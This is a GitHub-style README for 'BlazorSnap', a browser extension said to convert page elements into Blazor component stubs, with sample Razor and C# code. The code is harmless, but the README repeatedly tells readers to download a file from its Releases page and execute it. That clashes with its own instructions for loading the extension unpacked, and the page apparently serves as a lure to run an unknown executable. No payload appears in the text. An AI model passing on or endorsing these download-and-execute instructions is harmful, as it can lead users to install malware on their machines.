https://github.com/Jeje-007/BlazorSnap/releases

[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Jeje-007/BlazorSnap/releases)

# BlazorSnap — Convert Page Elements into Blazor Component Stubs

![Blazor logo](https://upload.wikimedia.org/wikipedia/commons/1/1b/Blazor_Logo.svg)  
![Browser extension mockup](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=0f8b8a7f4d60b4d7a7b2f4c7810c6c2e)

BlazorSnap lets you pick any DOM element in the browser and turn it into a Blazor component stub. The stub gives you a working Razor file, a code-behind template, and a short usage guide. Use it to speed up UI migration, prototype components, or audit markup for reuse.

Release files live at the Releases page. Download the release file from https://github.com/Jeje-007/BlazorSnap/releases and execute it to install the extension.

Badges
- Build: ![Build status](https://img.shields.io/badge/build-passing-brightgreen)
- License: ![MIT](https://img.shields.io/badge/license-MIT-green)
- Releases: [![Releases](https://img.shields.io/badge/Releases-%E2%9C%93-blue?style=flat-square)](https://github.com/Jeje-007/BlazorSnap/releases)

Features 🚀
- Select any element on the page and export a Razor stub.
- Capture inline styles and classes as component parameters.
- Extract nested markup into child components.
- Create a code-behind (.razor.cs) file with event handler stubs.
- Generate a small demo page that shows how to use the component.
- Support for common Blazor patterns: EventCallback, [Parameter], CascadingParameter.
- Light weight. No server required.

Why use BlazorSnap? 
- You convert existing UI to Blazor code without guesswork.
- You get a starting point that follows common Blazor patterns.
- You keep your markup and logic separate.

Screenshot
![Example output](https://raw.githubusercontent.com/jeffmath/placeholder-images/main/blazorsnap-sample.png)

Quick demo
1. Open a page with the UI you want to convert.
2. Click the BlazorSnap extension icon.
3. Hover and click an element.
4. Review the generated files in the popup.
5. Download the zip or copy code to clipboard.

Installation — download and run
- Visit the Releases page: https://github.com/Jeje-007/BlazorSnap/releases
- Download the release file for your browser. The release file needs to be downloaded and executed.
- Follow the platform steps in the release notes. The package will install the extension or give a dev build you can load.
- After install, pin the BlazorSnap icon to your toolbar.

If that link does not open or does not work, check the repository "Releases" section.

Extension UI overview
- Selector mode: Use a crosshair to pick an element.
- Options: Choose how deep to extract child nodes.
- Export format: Choose between single-file Razor, split Razor + code-behind, or a zip bundle.
- Property map: Map classes and styles to [Parameter] properties.
- Events: Map click, change, input to EventCallback<T> signatures.

Generated output: anatomy
- ComponentName.razor
  - Markup with @attributes.
  - @if / @foreach where repeated nodes exist.
  - Usage examples in comments.
- ComponentName.razor.cs
  - Partial class.
  - [Parameter] properties.
  - EventCallback members.
  - Placeholder methods for handlers.
- README-ComponentName.md
  - How to register and use the component.
  - Notes on dependencies and CSS.
- assets/
  - Extracted images or styles referenced by the markup.

Example generated .razor
```razor
@namespace Project.Components
<div class="@CssClass" @onclick="OnClick">
  <h3>@Title</h3>
  <p>@ChildContent</p>
</div>

@code {
  [Parameter] public string Title { get; set; }
  [Parameter] public string CssClass { get; set; }
  [Parameter] public RenderFragment ChildContent { get; set; }
  [Parameter] public EventCallback<MouseEventArgs> OnClick { get; set; }
}
```

Example generated .razor.cs
```csharp
using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Web;

namespace Project.Components
{
  public partial class ComponentName
  {
    private async Task HandleClick(MouseEventArgs e)
    {
      // Add logic.
      await OnClick.InvokeAsync(e);
    }
  }
}
```

Customization options
- Naming rules: Pick full name or auto name from classes or ARIA labels.
- Parameter mapping: Auto-map common attributes like src, alt, href, value.
- CSS strategy: Inline styles as parameter, or externalize to a CSS file.
- Child extraction depth: 0..5 levels.
- Event mapping: Select which DOM events map to EventCallback.

How BlazorSnap handles complex cases
- Forms: BlazorSnap maps inputs to InputText / InputNumber when obvious.
- Tables: It creates a component for the table and optional row component for complex cells.
- Lists: It detects repeated items and suggests a data model and @foreach pattern.
- SVG and Canvas: It inlines markup and marks potential JS interop points.
- Scripts: It extracts references and warns about script dependencies in the metadata.

Tips for clean stubs
- Name components with PascalCase.
- Avoid copying injected scripts. Move scripts to a known place.
- Convert inline scripts to JS interop manually.
- Replace heavy DOM manipulation with event handlers.

Common workflows
- Migration: Crawl a page, capture major UI pieces, slot stubs into a shared project.
- Prototyping: Snap a widget and tweak parameters to test behaviors.
- Audit: Extract several components to inspect styling and dependencies.

Commands and keyboard shortcuts
- Toggle selector: Ctrl+Shift+S (configurable)
- Copy code: Ctrl+C in the preview pane
- Download zip: Click the download button in popup
- Open settings: Click gear icon in the extension popup

Developer notes
- The extension runs in the page context to read DOM nodes.
- It sanitizes attributes to avoid breaking Razor parsing.
- It creates RenderFragment placeholders for complex child content.

Security model
- The extension reads the page DOM to build markup.
- It does not send page data to remote servers by default.
- Review generated code before use in production.

Contributing
- Fork the repository.
- Create a branch with a descriptive name.
- Add tests for new features.
- Open a pull request with a clear changelog entry.

How to test locally
- Clone the repo.
- Open the extension folder for your browser.
- Load the unpacked extension in developer mode.
- Visit a test page and run selector workflows.
- Unit test core extraction logic with sample HTML fixtures.

Release and download
- Official binary and extension builds appear in Releases.
- Download the release file from https://github.com/Jeje-007/BlazorSnap/releases and execute it to install or unpack the build artifacts.
- Each release includes changelog, build notes, and checksums.

Changelog highlights
- v1.2.0: Added table and list extraction strategies.
- v1.1.0: Added code-behind generation and EventCallback mapping.
- v1.0.0: Initial release with basic selector and Razor export.

FAQ
Q: Which browsers work?
A: Chrome, Edge, and Firefox builds are available. Check the release notes for platform specifics.

Q: Will it convert JS widgets?
A: It extracts markup and notes JS dependencies. You must re-implement dynamic logic in Blazor or use JS interop.

Q: Can I use the output in a Blazor Server app?
A: Yes. Generated code uses standard Blazor patterns and works in both Server and WebAssembly.

License
This project uses the MIT license. See LICENSE file for details.

Support and contact
Report issues on the repository issue tracker. Provide a sample page URL or HTML snippet and a clear description of the expected output.